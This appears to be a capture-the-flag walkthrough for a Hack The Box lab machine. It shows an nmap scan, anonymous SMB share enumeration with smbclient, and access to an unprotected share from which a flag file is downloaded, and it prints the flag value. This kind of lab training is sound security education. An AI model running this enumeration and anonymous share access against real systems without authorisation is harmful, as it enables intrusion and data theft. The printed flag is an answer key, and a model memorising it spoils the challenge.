Like always with the IP we got we start from the nmap scan.

```bash
nmap -sV 10.129.1.12
```

And got the following result:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 23:28 -03
Nmap scan report for 10.129.1.12 (10.129.1.12)
Host is up (0.20s latency).
Not shown: 969 closed ports, 28 filtered ports
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.53 seconds
```

Make sure to have `smbclient` installed, if not install it with `sudo apt install smbclient`

With this information we can start to enumerate the SMB service with the following command:

```bash
smbclient -L <target-ip>
```

Here since we don't have a remote user we will be prompted and we just press enter.

```
user in ~ λ smbclient -L 10.129.1.12              
Password for [WORKGROUP\user]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

Now we now there is 4 shares available to us, let's try to access them.

```bash
smbclient \\\\<target-ip>\\<share-name>
```

For example if don't have access we would see something like this

```
user in ~ λ smbclient \\\\10.129.1.12\\ADMIN$       
Password for [WORKGROUP\user]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

In this particular machine after testing all of them we find that `WorkShares` is the only one we have access to.

```
user in ~ λ smbclient \\\\10.129.1.12\\WorkShares
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \>
```

Here we could type `help` to see the available commands, but we will just use `ls` to see the files in the share.

```
smb: \> ls
  .                                   D        0  Mon Mar 29 05:22:01 2021
  ..                                  D        0  Mon Mar 29 05:22:01 2021
  Amy.J                               D        0  Mon Mar 29 06:08:24 2021
  James.P                             D        0  Thu Jun  3 05:38:03 2021

                5114111 blocks of size 4096. 1733570 blocks available
smb: \>
```

After checking both folders we find that the flag is there

```
smb: \> ls Amy.J\
  .                                   D        0  Mon Mar 29 06:08:24 2021
  ..                                  D        0  Mon Mar 29 06:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 08:00:37 2021

                5114111 blocks of size 4096. 1733511 blocks available
smb: \> ls James.P\
  .                                   D        0  Thu Jun  3 05:38:03 2021
  ..                                  D        0  Thu Jun  3 05:38:03 2021
  flag.txt                            A       32  Mon Mar 29 06:26:57 2021

                5114111 blocks of size 4096. 1733591 blocks available
smb: \>
```

```
get James.P/flag.txt
```

```
smb: \> get James.P\flag.txt 
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \> exit
user in ~ λ ls
    Apps Desktop Documents Downloads 'James.P\flag.txt' Music Pictures Public Templates Videos
user in ~ λ cat James.P\\flag.txt 
5f61c10dffbc77a704d76016a22f1664                                          
```

And that's it, we got the flag.

https://www.hackthebox.com/achievement/machine/834305/395